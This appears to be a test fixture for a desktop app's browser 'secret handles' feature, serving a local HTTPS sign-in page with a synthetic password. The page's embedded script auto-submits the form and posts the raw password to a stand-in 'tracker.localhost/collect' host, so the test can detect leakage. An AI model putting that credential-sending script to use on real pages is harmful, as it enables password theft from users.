import { execFileSync } from "node:child_process";
import { createHash, randomBytes, X509Certificate } from "node:crypto";
import { mkdirSync, readFileSync } from "node:fs";
import { createServer } from "node:https";
import { join } from "node:path";
import type { Seed } from "@openwork/env";
import { configureProvider } from "./chat.ts";
import { enableOrganizationCapabilities } from "./organization-capabilities.ts";

const FIXTURE_MODEL = { providerId: "secret-handles-fixture", modelId: "secret-handles-model" };

/** The desktop can still be settling its workspace when "create task" is first offered. */
async function firstSession(seed: Seed, app: Awaited<ReturnType<Seed["desktop"]>>, title: string) {
  const deadline = Date.now() + 120_000;
  for (;;) {
    try {
      return await seed.session(app, { title });
    } catch (error) {
      if (Date.now() > deadline) throw error;
      await new Promise((resolve) => setTimeout(resolve, 2_000));
    }
  }
}

const signInPage = `<!doctype html><meta charset="utf-8"><title>Billing sign-in</title>
<style>body{font:16px system-ui;margin:32px;max-width:420px}label,input,button{display:block;margin:8px 0}input{width:100%;padding:6px}</style>
<h1>Billing sign-in</h1><p id="status">Signed out</p>
<form id="signin"><label>Email<input name="email" type="email" autocomplete="off" value="avery@example.test"></label>
<label>Password<input name="password" type="password" autocomplete="off" required></label><button>Sign in</button></form><p id="pointer"></p>
<script>
const hex=async(text)=>Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256',new TextEncoder().encode(text))),b=>b.toString(16).padStart(2,'0')).join('');
const say=(text)=>{document.querySelector('#status').textContent=text;};
document.querySelector('#pointer').textContent='No pointer yet, page '+document.visibilityState+(document.hasFocus()?' focused':' unfocused');
document.addEventListener('pointerdown',(event)=>{document.querySelector('#pointer').textContent='Pointer on '+event.target.tagName;},true);
// Like sites that continue as soon as a code or password is complete: the form sends itself once the field is filled.
let sent=false;
document.querySelector('input[name=password]').addEventListener('input',(event)=>{
  if(sent||event.target.value.length<8)return;
  sent=true;setTimeout(()=>document.querySelector('#signin').requestSubmit(),250);
});
document.querySelector('#signin').addEventListener('submit',async(event)=>{
  event.preventDefault();
  try{
    say('Signing in');
    const form=new FormData(event.target);const password=String(form.get('password'));
    // What this page's own script can read from the field, as a digest: a digest is never swapped on the way out.
    await fetch('/script-read',{method:'POST',body:JSON.stringify({digest:await hex(password),length:password.length})});
    say('Checking the password');
    // The same text, sent by the page to a site the secret is not allowed for.
    await fetch('https://tracker.localhost:'+location.port+'/collect',{method:'POST',mode:'no-cors',body:password}).catch(()=>{});
    const response=await fetch('/sign-in',{method:'POST',body:new URLSearchParams(form)});
    say(response.ok?'Signed in to billing':'That password is wrong');
  }catch(error){say('Sign-in failed: '+(error&&error.name));}
});
</script>`;

/** What the fixture site received, as facts only: never the secret or the placeholder. */
export interface SecretSiteState {
  /** Each sign-in the allowed site received: did it carry the real password? */
  signIns: Array<{ carriedSecret: boolean }>;
  /** Each request the other site received: did it carry the real password, and how long was the text it got? */
  tracker: Array<{ carriedSecret: boolean; length: number }>;
  /** Each time the page's script read the field: was that text the real password, and how long was it? */
  scriptReads: Array<{ sawSecret: boolean; length: number }>;
  /** Every request the fixture received, as method, host and path. */
  requests: string[];
}

/**
 * A signed-in desktop whose organization has secret handles off, and a sign-in
 * site on https that only this run's desktop trusts.
 *
 * The site's certificate is made for this run. The desktop is told its public
 * key and nothing else (`--ignore-certificate-errors-spki-list`, through the
 * desktop's own ELECTRON_EXTRA_LAUNCH_ARGS), so the product's rule that a
 * secret only goes to https sites is exercised as shipped. `*.localhost`
 * names resolve to this machine without any resolver change. This world runs
 * the site in the test process, so it is local-only.
 */
export async function browserSecretHandlesWorld(seed: Seed) {
  const stack = new AsyncDisposableStack();
  try {
    const tls = seed.tmpPath("browser-secret-handles-tls");
    mkdirSync(tls, { recursive: true });
    execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2",
      "-keyout", join(tls, "key.pem"), "-out", join(tls, "cert.pem"), "-subj", "/CN=billing.localhost",
      "-addext", "subjectAltName=DNS:billing.localhost,DNS:tracker.localhost"], { stdio: "ignore" });
    const cert = readFileSync(join(tls, "cert.pem"));
    const pin = createHash("sha256").update(new X509Certificate(cert).publicKey.export({ type: "spki", format: "der" })).digest("base64");

    // Synthetic and made for this run. It is typed into OpenWork's own dialog and reaches only this server.
    const password = `fixture-${randomBytes(12).toString("hex")}`;
    const passwordDigest = createHash("sha256").update(password).digest("hex");
    const state: SecretSiteState = { signIns: [], tracker: [], scriptReads: [], requests: [] };
    const server = createServer({ key: readFileSync(join(tls, "key.pem")), cert }, async (request, response) => {
      const host = String(request.headers.host ?? "").split(":")[0];
      let body = "";
      for await (const chunk of request) body += chunk;
      response.setHeader("Cache-Control", "no-store");
      state.requests.push(`${request.method} ${host}${String(request.url).split("?")[0]}`);
      if (host === "tracker.localhost") {
        if (request.method === "POST") state.tracker.push({ carriedSecret: body.includes(password), length: body.length });
        response.writeHead(204).end();
        return;
      }
      if (request.method === "POST" && request.url === "/sign-in") {
        const carriedSecret = new URLSearchParams(body).get("password") === password;
        state.signIns.push({ carriedSecret });
        response.writeHead(carriedSecret ? 200 : 401, { "Content-Type": "application/json" }).end("{}");
        return;
      }
      if (request.method === "POST" && request.url === "/script-read") {
        const read: unknown = JSON.parse(body);
        const digest = typeof read === "object" && read !== null ? Reflect.get(read, "digest") : null;
        const length = typeof read === "object" && read !== null ? Reflect.get(read, "length") : null;
        state.scriptReads.push({ sawSecret: digest === passwordDigest, length: typeof length === "number" ? length : -1 });
        response.writeHead(204).end();
        return;
      }
      if (request.url === "/favicon.ico") { response.writeHead(204).end(); return; }
      response.writeHead(200, { "Content-Type": "text/html" }).end(signInPage);
    });
    stack.defer(async () => {
      server.closeAllConnections();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const address = server.address();
    if (!address || typeof address === "string") throw new Error("The sign-in site did not start.");
    const site = `https://billing.localhost:${address.port}`;

    // No turn is sent to a model: the agent's side is the browser tool endpoint the engine's tools call.
    // A signed-in desktop still needs a selectable model before it lets a chat start.
    const den = await seed.den({ org: { name: "Secret handles workspace", admin: { name: "Avery Owner" } }, mocks: { model: seed.mock({}) } });
    const model = den.mocks.model;
    if (!model) throw new Error("seed.den() did not boot the fixture model.");
    const app = await seed.desktop({
      name: "browser-secret-handles", den, as: "admin", model: `${FIXTURE_MODEL.providerId}/${FIXTURE_MODEL.modelId}`,
      env: { ELECTRON_EXTRA_LAUNCH_ARGS: `--ignore-certificate-errors-spki-list=${pin}` },
    });
    const workspace = await seed.workspace(app, seed.tmpPath("browser-secret-handles"));
    await configureProvider(seed, app, workspace.workspaceId, FIXTURE_MODEL.providerId, FIXTURE_MODEL.modelId, {
      provider: {
        [FIXTURE_MODEL.providerId]: {
          npm: "@ai-sdk/openai-compatible", name: "Secret handles fixture",
          options: { baseURL: `${model.url}/v1`, apiKey: "secret-handles-fixture-only" },
          models: { [FIXTURE_MODEL.modelId]: { name: "Secret handles fixture model" } },
        },
      },
    });
    const neighbor = await firstSession(seed, app, "Separate research");
    const session = await firstSession(seed, app, "Pay the invoice");
    return {
      app, session, neighbor, site, password,
      signInUrl: `${site}/`,
      siteName: `billing.localhost:${address.port}`,
      /** What the fixture site has received so far. */
      received: (): SecretSiteState => structuredClone(state),
      /** A platform admin turns secret handles on for the organization, as /admin does. */
      turnOnSecretHandles: () => enableOrganizationCapabilities(seed, den.admin, { browserSecretHandles: true }),
      async [Symbol.asyncDispose]() { await stack.disposeAsync(); },
    };
  } catch (error) {
    await stack.disposeAsync();
    throw error;
  }
}
